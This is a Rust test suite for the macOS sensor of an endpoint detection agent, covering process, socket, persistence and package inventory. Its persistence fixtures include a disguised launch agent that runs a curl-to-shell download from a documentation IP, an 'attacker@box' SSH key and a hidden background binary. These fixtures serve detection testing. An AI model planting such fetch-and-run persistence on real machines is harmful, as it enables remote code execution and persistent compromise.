use std::collections::HashMap;
use std::io::Write;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr, TcpListener, TcpStream};
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use plist::{Dictionary, Value};
use sha2::{Digest, Sha256};
use zedr_shared::sensor::{PackageItem, PersistenceItem, Sensor, Socket, Source};
use zedr_shared::unix::parse_authorized_keys;
use zedr_shared::{InventoryAction, PackageManager, PersistenceKind, ProcessAction, ProcessEvent, StopReason, SystemEvent};

use crate::collector::{self, MacSource, TcpRow};
use crate::kernel::{self, SOCKET_FDINFO_BYTES};
use crate::{host, packages, persistence, service};

const ED25519_KEY: &str = "AAAAC3NzaC1lZDI1NTE5AAAAIKhakgEouqfK6smUqU2sY0O1i5Xj6lq+6llCBtQfPYeO";
const ED25519_FINGERPRINT: &str = "SHA256:qyZYFDs7jXkFw3lnFg23jK1InOXW7kSZfPKbC/4mEWc";

fn test_dir(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("zedr-macos-{}-{}", std::process::id(), name));
    let _ = std::fs::remove_dir_all(&dir);
    dir
}

fn mode(path: &Path) -> u32 {
    std::fs::metadata(path).unwrap().permissions().mode() & 0o777
}

fn now() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs()
}

fn real_source() -> MacSource {
    MacSource::new(Path::new("/")).unwrap()
}

fn procargs(argc: i32, rest: &[u8]) -> Vec<u8> {
    let mut raw = argc.to_ne_bytes().to_vec();
    raw.extend_from_slice(rest);
    raw
}

#[test]
fn test_arguments_are_read_past_the_executable_path_and_stop_before_the_environment() {
    let raw = procargs(3, b"/bin/sh\0\0\0\0sh\0-c\0echo hi there\0PATH=/usr/bin\0HOME=/var/root\0");
    assert_eq!(collector::parse_arguments(&raw), vec!["sh", "-c", "echo hi there"]);

    let with_empty = procargs(3, b"/usr/bin/env\0\0env\0\0-i\0SECRET=1\0");
    assert_eq!(collector::parse_arguments(&with_empty), vec!["env", "-i"], "an empty argument is counted and left out, as on Linux");

    let cut_short = procargs(5, b"/bin/sleep\0sleep\x00300");
    assert_eq!(collector::parse_arguments(&cut_short), vec!["sleep", "300"]);

    let long = procargs(1, &[b"/bin/a\0".as_slice(), &vec![b'a'; 10_000], b"\0"].concat());
    assert_eq!(collector::parse_arguments(&long)[0].len(), 4096);

    assert!(collector::parse_arguments(b"").is_empty());
    assert!(collector::parse_arguments(&procargs(-1, b"/bin/sh\0sh\0")).is_empty());
}

#[test]
fn test_image_changes_with_the_executable_and_not_with_time() {
    assert_eq!(collector::image_of("/bin/zsh"), collector::image_of("/bin/zsh"));
    assert_ne!(collector::image_of("/bin/zsh"), collector::image_of("/bin/sleep"));
}

#[test]
fn test_own_process_is_listed_with_its_real_executable_parent_and_command_line() {
    let mut source = real_source();
    let keys = source.processes().unwrap();
    assert!(keys.iter().all(|key| key.pid != 0), "the kernel task is not a process");
    assert!(keys.windows(2).all(|pair| pair[0].pid < pair[1].pid));
    let own = keys.iter().find(|key| key.pid == std::process::id()).expect("own process is listed");

    let details = source.describe(own).unwrap();
    let executable = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
    assert_eq!(details.executable_path, executable.to_string_lossy());
    assert_eq!(own.image, collector::image_of(&details.executable_path));
    assert_eq!(details.command_line, std::env::args().collect::<Vec<String>>());
    assert_eq!(details.uid, host::own_uid());
    assert_eq!(details.ppid, std::os::unix::process::parent_id());
    assert!(keys.iter().any(|key| key.pid == details.ppid), "the parent is in the same list");
    assert!(details.started_at <= now() && details.started_at + 600 > now(), "start time {} is not close to now {}", details.started_at, now());

    let reused = zedr_shared::sensor::ProcessKey { pid: own.pid, started: own.started + 1, image: own.image };
    assert_eq!(source.describe(&reused), None, "a pid that now belongs to another process is not described");
}

fn process_events(events: Vec<SystemEvent>, pid: u32) -> Vec<ProcessEvent> {
    events
        .into_iter()
        .filter_map(|event| match event {
            SystemEvent::Process(process) if process.pid == pid => Some(process),
            _ => None,
        })
        .collect()
}

fn poll_until(sensor: &mut Sensor<MacSource>, pid: u32, wanted: impl Fn(&ProcessEvent) -> bool) -> ProcessEvent {
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        if let Some(found) = process_events(sensor.poll(now()).events, pid).into_iter().find(|event| wanted(event)) {
            return found;
        }
        assert!(Instant::now() < deadline, "the expected process event never appeared");
        std::thread::sleep(Duration::from_millis(50));
    }
}

#[test]
fn test_real_child_process_is_seen_starting_changing_image_and_ending() {
    let mut sensor = Sensor::new(real_source(), std::process::id(), 60, 300);
    sensor.poll(now());

    let mut child = Command::new("/bin/sh").args(["-c", "read line; exec /bin/sleep 300"]).stdin(Stdio::piped()).spawn().unwrap();
    let pid = child.id();

    let created = poll_until(&mut sensor, pid, |event| matches!(event.action, ProcessAction::Create));
    assert_eq!(created.ppid, std::process::id());
    assert_eq!(created.command_line, vec!["/bin/sh", "-c", "read line; exec /bin/sleep 300"]);
    assert_eq!(created.uid, host::own_uid());
    assert!(created.executable_path.ends_with("sh"), "unexpected image {}", created.executable_path);
    assert!(created.timestamp + 60 > now());

    child.stdin.take().unwrap().write_all(b"go\n").unwrap();
    let changed = poll_until(&mut sensor, pid, |event| matches!(event.action, ProcessAction::Modify) && event.command_line == ["/bin/sleep", "300"]);
    assert_eq!(changed.executable_path, "/bin/sleep");

    child.kill().unwrap();
    child.wait().unwrap();
    let ended = poll_until(&mut sensor, pid, |event| matches!(event.action, ProcessAction::Terminate));
    assert_eq!(ended.command_line, vec!["/bin/sleep", "300"]);
}

fn socket_fdinfo(kind: i32, family: i32, version: u8, local: ([u8; 16], u16), remote: ([u8; 16], u16), state: i32, so: u64) -> [u8; SOCKET_FDINFO_BYTES] {
    let mut info = [0u8; SOCKET_FDINFO_BYTES];
    info[160..168].copy_from_slice(&so.to_ne_bytes());
    info[184..188].copy_from_slice(&family.to_ne_bytes());
    info[256..260].copy_from_slice(&kind.to_ne_bytes());
    info[264..268].copy_from_slice(&i32::from(u16::from_ne_bytes(remote.1.to_be_bytes())).to_ne_bytes());
    info[268..272].copy_from_slice(&i32::from(u16::from_ne_bytes(local.1.to_be_bytes())).to_ne_bytes());
    info[288] = version;
    info[296..312].copy_from_slice(&remote.0);
    info[312..328].copy_from_slice(&local.0);
    info[344..348].copy_from_slice(&state.to_ne_bytes());
    info
}

fn in4in6(address: [u8; 4]) -> [u8; 16] {
    let mut bytes = [0u8; 16];
    bytes[12..].copy_from_slice(&address);
    bytes
}

#[test]
fn test_tcp_socket_info_is_decoded_at_the_offsets_of_the_sdk() {
    let v4 = socket_fdinfo(2, libc::AF_INET, 1, (in4in6([10, 0, 0, 5]), 40000), (in4in6([203, 0, 113, 7]), 4444), 4, 0xfeed);
    assert_eq!(
        collector::parse_socket(&v4),
        Some(TcpRow { local: "10.0.0.5:40000".parse().unwrap(), remote: "203.0.113.7:4444".parse().unwrap(), state: 4, inode: 0xfeed })
    );

    let v6: [u8; 16] = "2001:db8::1".parse::<Ipv6Addr>().unwrap().octets();
    let peer: [u8; 16] = "2001:db8::2".parse::<Ipv6Addr>().unwrap().octets();
    let row = collector::parse_socket(&socket_fdinfo(2, libc::AF_INET6, 2, (v6, 40017), (peer, 443), 4, 7)).unwrap();
    assert_eq!((row.local.to_string(), row.remote.to_string()), ("[2001:db8::1]:40017".to_string(), "[2001:db8::2]:443".to_string()));

    let mapped: [u8; 16] = "::ffff:203.0.113.11".parse::<Ipv6Addr>().unwrap().octets();
    let row = collector::parse_socket(&socket_fdinfo(2, libc::AF_INET6, 2, (v6, 40018), (mapped, 443), 4, 8)).unwrap();
    assert_eq!(row.remote.to_string(), "203.0.113.11:443", "a mapped address is shown as IPv4");

    let udp = socket_fdinfo(1, libc::AF_INET, 1, (in4in6([10, 0, 0, 5]), 5353), (in4in6([0; 4]), 0), 0, 9);
    assert_eq!(collector::parse_socket(&udp), None, "a socket that is not TCP is not read");
    let unix = socket_fdinfo(2, libc::AF_UNIX, 1, (in4in6([10, 0, 0, 5]), 1), (in4in6([10, 0, 0, 6]), 2), 4, 10);
    assert_eq!(collector::parse_socket(&unix), None);
}

fn row(local: &str, remote: &str, state: i32, inode: u64) -> TcpRow {
    TcpRow { local: local.parse().unwrap(), remote: remote.parse().unwrap(), state, inode }
}

#[test]
fn test_only_live_connections_the_host_opened_count_as_outbound() {
    let rows = vec![
        row("0.0.0.0:8080", "0.0.0.0:0", 1, 1001),
        row("10.0.0.5:8080", "10.0.0.9:54321", 4, 1002),
        row("10.0.0.5:40000", "203.0.113.7:4444", 4, 1003),
        row("10.0.0.5:40001", "203.0.113.10:443", 10, 1004),
        row("10.0.0.5:40002", "203.0.113.8:80", 2, 1005),
        row("10.0.0.5:40003", "203.0.113.9:80", 3, 1006),
        row("10.0.0.5:40004", "203.0.113.9:80", 0, 1007),
        row("10.0.0.5:40005", "203.0.113.9:80", 4, 0),
    ];
    let inodes: Vec<u64> = collector::outbound(rows).iter().map(|socket| socket.inode).collect();
    assert_eq!(inodes, vec![1003, 1005], "listener, accepted connection, half open, closed and time-wait leftovers are left out");
}

fn assert_connection_is_found(listen_on: SocketAddr) {
    let listener = TcpListener::bind(listen_on).unwrap();
    let client = TcpStream::connect(listener.local_addr().unwrap()).unwrap();
    let (_accepted, _) = listener.accept().unwrap();

    let mut source = real_source();
    source.processes().unwrap();
    let sockets = source.outbound_sockets().unwrap();

    let ours: Vec<Socket> =
        sockets.iter().filter(|socket| socket.local == client.local_addr().unwrap() && socket.remote == listener.local_addr().unwrap()).cloned().collect();
    assert_eq!(ours.len(), 1, "the connecting end is listed once in {:?}", sockets);
    assert!(sockets.iter().all(|socket| socket.local.port() != listener.local_addr().unwrap().port()), "the listener and the accepting end are not outbound");

    let holders = source.socket_holders(&ours);
    assert_eq!(holders, HashMap::from([(ours[0].inode, vec![std::process::id()])]));
}

#[test]
fn test_real_ipv4_connection_is_listed_as_outbound_and_traced_to_this_process() {
    assert_connection_is_found(SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 0));
}

#[test]
fn test_real_ipv6_connection_is_listed_as_outbound_and_traced_to_this_process() {
    assert_connection_is_found(SocketAddr::new(IpAddr::V6(Ipv6Addr::LOCALHOST), 0));
}

#[test]
fn test_host_is_described_for_registration() {
    let host = host::describe();
    assert!(!host.hostname.is_empty() && host.hostname != "unknown");
    let product = kernel::system_text(c"kern.osproductversion").unwrap();
    let build = kernel::system_text(c"kern.osversion").unwrap();
    assert_eq!(host.os_version, format!("macOS {} ({})", product, build));
    assert!(product.chars().next().is_some_and(|first| first.is_ascii_digit()), "{}", product);
    assert_eq!(host.agent_version, env!("CARGO_PKG_VERSION"));
}

#[test]
fn test_user_ids_are_named_by_the_directory_service() {
    assert_eq!(kernel::user_name(0).as_deref(), Some("root"));
    assert!(kernel::user_name(host::own_uid()).is_some_and(|name| !name.is_empty()));
    assert_eq!(kernel::user_name(u32::MAX - 7), None);
}

#[test]
fn test_state_directory_is_created_for_its_owner_only() {
    let dir = test_dir("state-new").join("nested");
    host::ensure_private_dir(&dir).unwrap();
    assert_eq!(mode(&dir), 0o700);
    std::fs::remove_dir_all(dir.parent().unwrap()).unwrap();
}

#[test]
fn test_state_directory_open_to_others_is_closed() {
    let dir = test_dir("state-open");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();

    host::ensure_private_dir(&dir).unwrap();

    assert_eq!(mode(&dir), 0o700);
    std::fs::remove_dir_all(&dir).unwrap();
}

#[test]
fn test_state_directory_behind_a_symlink_or_a_file_is_refused() {
    let target = test_dir("state-target");
    std::fs::create_dir_all(&target).unwrap();
    let link = test_dir("state-link");
    std::os::unix::fs::symlink(&target, &link).unwrap();
    assert!(host::ensure_private_dir(&link).unwrap_err().contains("not a directory"));

    let file = target.join("file");
    std::fs::write(&file, "x").unwrap();
    assert!(host::ensure_private_dir(&file).unwrap_err().contains("not a directory"));

    std::fs::remove_file(&link).unwrap();
    std::fs::remove_dir_all(&target).unwrap();
}

#[test]
fn test_state_directory_of_another_user_is_refused() {
    if host::own_uid() == 0 {
        let dir = test_dir("state-foreign");
        std::fs::create_dir_all(&dir).unwrap();
        std::os::unix::fs::chown(&dir, Some(12345), None).unwrap();
        assert!(host::ensure_private_dir(&dir).unwrap_err().contains("belongs to user 12345"));
        std::fs::remove_dir_all(&dir).unwrap();
    } else {
        assert!(host::ensure_private_dir(Path::new("/")).unwrap_err().contains("belongs to user 0"));
    }
}

#[test]
fn test_every_stop_is_reported_as_a_service_stop() {
    assert_eq!(service::stop_reason(), StopReason::ServiceStop);
}

const PRIVATE_FOLDER: &str = "/Users/dana/Library/LaunchAgents";

struct Tree {
    root: PathBuf,
}

impl Tree {
    fn new(name: &str) -> Self {
        let tree = Self { root: test_dir(name) };
        std::fs::create_dir_all(tree.root.join("Library")).unwrap();
        tree
    }

    fn at(&self, path: &str) -> PathBuf {
        self.root.join(path.trim_start_matches('/'))
    }

    fn write(&self, path: &str, contents: impl AsRef<[u8]>) {
        let file = self.at(path);
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::fs::write(file, contents).unwrap();
    }

    fn mkdir(&self, path: &str) {
        std::fs::create_dir_all(self.at(path)).unwrap();
    }

    fn persistence(&self) -> Vec<PersistenceItem> {
        persistence::scan(&self.root, |_| None).unwrap()
    }

    fn packages(&self) -> Result<Vec<PackageItem>, String> {
        packages::scan(&self.root, |_| None)
    }
}

impl Drop for Tree {
    fn drop(&mut self) {
        for directory in ["/Applications", PRIVATE_FOLDER] {
            let _ = std::fs::set_permissions(self.at(directory), std::fs::Permissions::from_mode(0o755));
        }
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

fn sha256(contents: impl AsRef<[u8]>) -> Option<String> {
    Some(hex::encode(Sha256::digest(contents.as_ref())))
}

fn listed(kind: PersistenceKind, name: &str, path: &str, command: &str, user: &str, enabled: bool, hash: Option<String>) -> PersistenceItem {
    PersistenceItem { kind, name: name.to_string(), path: path.to_string(), command: command.to_string(), user: user.to_string(), enabled, hash }
}

fn xml_job(body: &str) -> String {
    format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n{}</dict>\n</plist>\n",
        body
    )
}

fn binary_plist(entries: Vec<(&str, Value)>) -> Vec<u8> {
    let mut dictionary = Dictionary::new();
    for (key, value) in entries {
        dictionary.insert(key.to_string(), value);
    }
    let mut bytes = Vec::new();
    Value::Dictionary(dictionary).to_writer_binary(&mut bytes).unwrap();
    bytes
}

fn strings(values: &[&str]) -> Value {
    Value::Array(values.iter().map(|value| Value::String(value.to_string())).collect())
}

#[test]
fn test_launch_jobs_are_read_from_xml_and_binary_definitions() {
    let backup = xml_job(concat!(
        "<key>Label</key><string>com.example.backup</string>\n",
        "<key>UserName</key><string>backup</string>\n",
        "<key>ProgramArguments</key><array><string>/usr/local/bin/backup</string><string>--all</string></array>\n",
        "<key>RunAtLoad</key><true/>\n",
    ));
    let disabled = xml_job(concat!(
        "<key>Label</key><string>com.example.helper</string>\n",
        "<key>Program</key><string>/opt/helper/run</string>\n",
        "<key>ProgramArguments</key><array><string>helper</string><string>--serve</string></array>\n",
        "<key>Disabled</key><true/>\n",
    ));
    let planted = binary_plist(vec![
        ("Label", Value::String("com.apple.updates".to_string())),
        ("ProgramArguments", strings(&["/bin/sh", "-c", "curl -fsS http://203.0.113.47/m | sh"])),
        ("RunAtLoad", Value::Boolean(true)),
    ]);
    assert!(planted.starts_with(b"bplist00"));
    let everyone =
        xml_job("<key>Label</key><string>com.example.agent</string>\n<key>Program</key><string>/Applications/Example.app/Contents/MacOS/agent</string>\n");

    let tree = Tree::new("launchd");
    tree.write("/Library/LaunchDaemons/com.example.backup.plist", &backup);
    tree.write("/Library/LaunchDaemons/com.example.helper.plist", &disabled);
    tree.write("/Library/LaunchDaemons/com.example.stub.plist", xml_job(""));
    tree.write("/Library/LaunchAgents/com.example.agent.plist", &everyone);
    tree.write("/Library/LaunchAgents/broken.plist", "not a property list");
    tree.write("/Library/LaunchAgents/.hidden.plist", &everyone);
    tree.write("/Users/dana/Library/LaunchAgents/com.apple.updates.plist", &planted);
    tree.write("/Users/Shared/Library/LaunchAgents/com.example.shared.plist", &everyone);
    tree.write("/System/Library/LaunchDaemons/com.apple.sealed.plist", &backup);

    assert_eq!(
        tree.persistence(),
        vec![
            listed(PersistenceKind::LaunchDaemon, "com.example.backup", "/Library/LaunchDaemons/com.example.backup.plist", "/usr/local/bin/backup --all", "backup", true, sha256(&backup)),
            listed(PersistenceKind::LaunchDaemon, "com.example.helper", "/Library/LaunchDaemons/com.example.helper.plist", "/opt/helper/run --serve", "root", false, sha256(&disabled)),
            listed(PersistenceKind::LaunchDaemon, "com.example.stub.plist", "/Library/LaunchDaemons/com.example.stub.plist", "", "root", false, sha256(xml_job(""))),
            listed(PersistenceKind::LaunchAgent, "broken.plist", "/Library/LaunchAgents/broken.plist", "", "", false, sha256("not a property list")),
            listed(
                PersistenceKind::LaunchAgent,
                "com.example.agent",
                "/Library/LaunchAgents/com.example.agent.plist",
                "/Applications/Example.app/Contents/MacOS/agent",
                "",
                true,
                sha256(&everyone)
            ),
            listed(
                PersistenceKind::LaunchAgent,
                "com.apple.updates",
                "/Users/dana/Library/LaunchAgents/com.apple.updates.plist",
                "/bin/sh -c curl -fsS http://203.0.113.47/m | sh",
                "dana",
                true,
                sha256(&planted)
            ),
        ],
        "a job runs Program with the rest of its arguments, a definition without a label and a program or one launchd cannot read does not start, Shared and /System are not read"
    );
}

#[test]
fn test_launch_job_definition_is_parsed_for_what_launchd_runs() {
    let job = persistence::parse_launch_job(
        xml_job("<key>Label</key><string>a</string><key>ProgramArguments</key><array><string>/bin/x</string><integer>3</integer><string>-v</string></array>")
            .as_bytes(),
    )
    .unwrap();
    assert_eq!((job.label.as_deref(), job.command.as_str(), job.disabled, job.user), (Some("a"), "/bin/x -v", false, None));

    let unnamed =
        persistence::parse_launch_job(&binary_plist(vec![("Program", Value::String("/bin/y".to_string())), ("Disabled", Value::Boolean(false))])).unwrap();
    assert_eq!((unnamed.label, unnamed.command.as_str(), unnamed.disabled), (None, "/bin/y", false));

    assert_eq!(persistence::parse_launch_job(b"<plist><array/></plist>"), None, "a definition is a dictionary");
}

#[test]
fn test_cron_profiles_and_keys_are_listed_for_the_accounts_they_belong_to() {
    let tree = Tree::new("unix-items");
    tree.write("/etc/crontab", "SHELL=/bin/sh\n@reboot root /opt/boot.sh\n");
    tree.write("/usr/lib/cron/tabs/dana", "# DO NOT EDIT\n0 3 * * * /Users/dana/sync.sh\n");
    tree.write("/etc/zshrc", "setopt prompt_subst\n");
    tree.write("/etc/zshenv", "export PATH\n");
    tree.write("/Users/dana/.zshenv", "nohup /tmp/.x &\n");
    tree.write("/Users/dana/.zsh_history", "not a profile\n");
    tree.write("/var/root/.ssh/authorized_keys", format!("ssh-ed25519 {} attacker@box\n", ED25519_KEY));
    tree.write("/Users/dana/.ssh/authorized_keys2", format!("command=\"/usr/bin/backup\" ssh-ed25519 {}\n", ED25519_KEY));

    let items: Vec<PersistenceItem> = tree.persistence();
    let key_hash = Some(parse_authorized_keys(&format!("ssh-ed25519 {}", ED25519_KEY)).remove(0).hash);
    assert_eq!(
        items,
        vec![
            listed(PersistenceKind::Cron, "@reboot root /opt/boot.sh", "/etc/crontab", "/opt/boot.sh", "root", true, sha256("@reboot root /opt/boot.sh")),
            listed(
                PersistenceKind::Cron,
                "0 3 * * * /Users/dana/sync.sh",
                "/usr/lib/cron/tabs/dana",
                "/Users/dana/sync.sh",
                "dana",
                true,
                sha256("0 3 * * * /Users/dana/sync.sh")
            ),
            listed(PersistenceKind::ShellProfile, "zshenv", "/etc/zshenv", "", "", true, sha256("export PATH\n")),
            listed(PersistenceKind::ShellProfile, "zshrc", "/etc/zshrc", "", "", true, sha256("setopt prompt_subst\n")),
            listed(PersistenceKind::ShellProfile, ".zshenv", "/Users/dana/.zshenv", "", "dana", true, sha256("nohup /tmp/.x &\n")),
            listed(
                PersistenceKind::AuthorizedKey,
                &format!("ssh-ed25519 {} attacker@box", ED25519_FINGERPRINT),
                "/var/root/.ssh/authorized_keys",
                "",
                "root",
                true,
                key_hash.clone()
            ),
            listed(
                PersistenceKind::AuthorizedKey,
                &format!("ssh-ed25519 {}", ED25519_FINGERPRINT),
                "/Users/dana/.ssh/authorized_keys2",
                "/usr/bin/backup",
                "dana",
                true,
                key_hash
            ),
        ]
    );
}

#[test]
fn test_files_that_cannot_be_read_are_listed_without_a_hash_and_never_block_the_scan() {
    let tree = Tree::new("unreadable");
    tree.write("/Users/dana/.ssh/authorized_keys", "# padding\n".repeat(110_000));
    tree.mkdir("/Users/dana/.zshrc");
    assert!(Command::new("mkfifo").arg(tree.at("/Users/dana/.zprofile")).status().unwrap().success());
    tree.write("/Library/LaunchDaemons/com.example.huge.plist", vec![b' '; 1024 * 1024 + 1]);

    let mut expected = vec![
        listed(PersistenceKind::LaunchDaemon, "com.example.huge.plist", "/Library/LaunchDaemons/com.example.huge.plist", "", "root", true, None),
        listed(PersistenceKind::AuthorizedKey, "authorized_keys", "/Users/dana/.ssh/authorized_keys", "", "dana", true, None),
    ];

    if host::own_uid() != 0 {
        tree.write("/Library/LaunchAgents/com.example.private.plist", xml_job(""));
        std::fs::set_permissions(tree.at("/Library/LaunchAgents/com.example.private.plist"), std::fs::Permissions::from_mode(0o000)).unwrap();
        tree.mkdir(PRIVATE_FOLDER);
        std::fs::set_permissions(tree.at(PRIVATE_FOLDER), std::fs::Permissions::from_mode(0o000)).unwrap();
        expected.insert(
            1,
            listed(PersistenceKind::LaunchAgent, "com.example.private.plist", "/Library/LaunchAgents/com.example.private.plist", "", "", true, None),
        );
        expected.insert(2, listed(PersistenceKind::LaunchAgent, "LaunchAgents", PRIVATE_FOLDER, "", "dana", true, None));
    }

    assert_eq!(
        tree.persistence(),
        expected,
        "a file over the size limit and a file or folder the agent may not read are listed as unread, a pipe and a directory are not files"
    );
}

#[test]
fn test_inventory_of_a_root_that_cannot_be_read_is_an_error() {
    let error = persistence::scan(&test_dir("no-such-root"), |_| None).unwrap_err();
    assert!(error.contains("Failed to read"), "{}", error);
}

fn persistence_changes(events: Vec<SystemEvent>) -> Vec<(InventoryAction, PersistenceKind, String, String, bool)> {
    events
        .into_iter()
        .filter_map(|event| match event {
            SystemEvent::Persistence(event) => Some((event.action, event.kind, event.path, event.command, event.enabled)),
            _ => None,
        })
        .collect()
}

#[test]
fn test_installed_changed_and_removed_launch_jobs_reach_the_sensor_as_events() {
    let tree = Tree::new("sensor-persistence");
    let daemon = "/Library/LaunchDaemons/com.example.backup.plist";
    tree.write(daemon, xml_job("<key>Label</key><string>com.example.backup</string><key>Program</key><string>/usr/local/bin/backup</string>"));
    let mut sensor = Sensor::new(MacSource::new(&tree.root).unwrap(), std::process::id(), 60, 300);

    let change = |action, kind, path: &str, command: &str, enabled| (action, kind, path.to_string(), command.to_string(), enabled);
    assert_eq!(
        persistence_changes(sensor.poll(1_000).events),
        vec![change(InventoryAction::Present, PersistenceKind::LaunchDaemon, daemon, "/usr/local/bin/backup", true)]
    );

    let agent = "/Library/LaunchAgents/com.apple.updates.plist";
    tree.write(agent, binary_plist(vec![("Label", Value::String("com.apple.updates".to_string())), ("ProgramArguments", strings(&["/tmp/.u/run"]))]));
    tree.write(
        daemon,
        xml_job("<key>Label</key><string>com.example.backup</string><key>Program</key><string>/usr/local/bin/backup</string><key>Disabled</key><true/>"),
    );

    assert!(persistence_changes(sensor.poll(1_030).events).is_empty(), "nothing is read before the interval has passed");
    assert_eq!(
        persistence_changes(sensor.poll(1_060).events),
        vec![
            change(InventoryAction::Changed, PersistenceKind::LaunchDaemon, daemon, "/usr/local/bin/backup", false),
            change(InventoryAction::Added, PersistenceKind::LaunchAgent, agent, "/tmp/.u/run", true),
        ]
    );

    std::fs::remove_file(tree.at(agent)).unwrap();
    assert_eq!(
        persistence_changes(sensor.poll(1_120).events),
        vec![change(InventoryAction::Removed, PersistenceKind::LaunchAgent, agent, "/tmp/.u/run", true)]
    );
}

#[test]
fn test_persistence_of_this_mac_is_read_without_error() {
    let items = persistence::scan(Path::new("/"), kernel::user_name).unwrap();
    assert!(items.iter().all(|item| !item.path.starts_with("/System/")));
    assert!(items.iter().all(|item| item.name.len() <= 256 + 1 + 16 && item.command.len() <= 4096));
    let daemons = items.iter().filter(|item| item.kind == PersistenceKind::LaunchDaemon).count();
    let agents = items.iter().filter(|item| item.kind == PersistenceKind::LaunchAgent).count();
    println!("{} persistence items, {} launch daemons, {} launch agents", items.len(), daemons, agents);
}

const THIN_ARM64: [u8; 8] = [0xcf, 0xfa, 0xed, 0xfe, 0x0c, 0x00, 0x00, 0x01];

fn fat(cpu_types: &[u32]) -> Vec<u8> {
    let mut header = vec![0xca, 0xfe, 0xba, 0xbe];
    header.extend_from_slice(&(cpu_types.len() as u32).to_be_bytes());
    for cpu_type in cpu_types {
        header.extend_from_slice(&cpu_type.to_be_bytes());
        header.extend_from_slice(&[0; 16]);
    }
    header
}

#[test]
fn test_architectures_are_read_from_the_mach_o_header() {
    assert_eq!(packages::mach_o_architectures(&THIN_ARM64), vec!["arm64"]);
    assert_eq!(packages::mach_o_architectures(&[0xcf, 0xfa, 0xed, 0xfe, 0x07, 0x00, 0x00, 0x01]), vec!["x86_64"]);
    assert_eq!(packages::mach_o_architectures(&fat(&[0x0100_0007, 0x0100_000c, 0x0100_000c])), vec!["arm64", "x86_64"]);
    assert_eq!(packages::mach_o_architectures(&fat(&[0x0100_0007, 0x0100_000c])[..20]), vec!["x86_64"], "a cut header lists what it holds");
    assert!(packages::mach_o_architectures(b"#!/bin/sh\n").is_empty());
    assert!(packages::mach_o_architectures(b"").is_empty());

    let own = std::fs::read(std::env::current_exe().unwrap()).unwrap();
    assert_eq!(packages::mach_o_architectures(&own[..4096]), vec![packages::machine_architecture()]);
}

#[test]
fn test_versions_are_ordered_by_their_numbers() {
    use std::cmp::Ordering::{Equal, Greater, Less};
    assert_eq!(packages::version_order("2.14.2", "2.14.1_1"), Greater);
    assert_eq!(packages::version_order("28.0.1", "28.2"), Less);
    assert_eq!(packages::version_order("1.10.0", "1.9.9"), Greater);
    assert_eq!(packages::version_order("2026-08-13", "2026-11-05"), Less);
    assert_eq!(packages::version_order("3.4.1", "3.4.1"), Equal);
    assert_eq!(packages::version_order("3.4", "3.4.1"), Less);
    assert_eq!(packages::version_order("latest", "1.0"), Greater);
}

fn installed(manager: PackageManager, name: &str, version: &str, architecture: &str) -> PackageItem {
    PackageItem { manager, name: name.to_string(), version: version.to_string(), architecture: architecture.to_string() }
}

fn info_plist(entries: &str) -> String {
    xml_job(entries)
}

#[test]
fn test_homebrew_bundles_and_receipts_are_listed_with_version_and_architecture() {
    let machine = packages::machine_architecture();
    let tree = Tree::new("packages");
    assert_eq!(tree.packages(), Ok(Vec::new()), "a Mac with none of these folders has no packages to list");

    for keg in ["openssl@3/3.4.0", "openssl@3/3.4.1", "glib/2.88.0", "glib/2.86.3"] {
        tree.mkdir(&format!("/opt/homebrew/Cellar/{}", keg));
    }
    tree.mkdir("/opt/homebrew/Cellar/empty");
    tree.write("/opt/homebrew/Cellar/.keepme", "");
    tree.mkdir("/usr/local/Cellar/wget/1.25.0");
    tree.mkdir("/opt/homebrew/Caskroom/firefox/.metadata/133.0/20241126");
    tree.mkdir("/opt/homebrew/Caskroom/firefox/133.0");

    tree.write(
        "/Applications/Example.app/Contents/Info.plist",
        info_plist("<key>CFBundleShortVersionString</key><string>2.1.0</string><key>CFBundleVersion</key><string>2100</string><key>CFBundleExecutable</key><string>Example</string>"),
    );
    tree.write("/Applications/Example.app/Contents/MacOS/Example", THIN_ARM64);
    tree.write(
        "/Applications/Utilities/Tool.app/Contents/Info.plist",
        binary_plist(vec![("CFBundleVersion", Value::String("77".to_string())), ("CFBundleExecutable", Value::String("Tool".to_string()))]),
    );
    tree.write("/Applications/Utilities/Tool.app/Contents/MacOS/Tool", fat(&[0x0100_0007, 0x0100_000c]));
    tree.mkdir("/Applications/Broken.app/Contents");
    tree.write("/Applications/notes.txt", "not a bundle");
    tree.write("/Applications/Fake.app", "a file, not a bundle");
    tree.write("/Users/dana/Applications/Personal.app/Contents/Info.plist", info_plist("<key>CFBundleShortVersionString</key><string>0.9</string>"));

    tree.write(
        "/var/db/receipts/com.example.pkg.plist",
        info_plist("<key>PackageIdentifier</key><string>com.example.pkg</string><key>PackageVersion</key><string>1.2.3</string>"),
    );
    tree.write("/var/db/receipts/com.example.pkg.bom", "bill of materials");
    tree.write("/var/db/receipts/garbage.plist", "not a property list");

    assert_eq!(
        tree.packages().unwrap(),
        vec![
            installed(PackageManager::Homebrew, "empty", "", "arm64"),
            installed(PackageManager::Homebrew, "glib", "2.88.0", "arm64"),
            installed(PackageManager::Homebrew, "openssl@3", "3.4.1", "arm64"),
            installed(PackageManager::Homebrew, "cask/firefox", "133.0", "arm64"),
            installed(PackageManager::Homebrew, "wget", "1.25.0", "x86_64"),
            installed(PackageManager::MacApp, "Broken", "", machine),
            installed(PackageManager::MacApp, "Example", "2.1.0", "arm64"),
            installed(PackageManager::MacApp, "Tool", "77", "arm64 x86_64"),
            installed(PackageManager::MacApp, "Personal", "0.9", machine),
            installed(PackageManager::MacPkg, "com.example.pkg", "1.2.3", machine),
            installed(PackageManager::MacPkg, "garbage", "", machine),
        ],
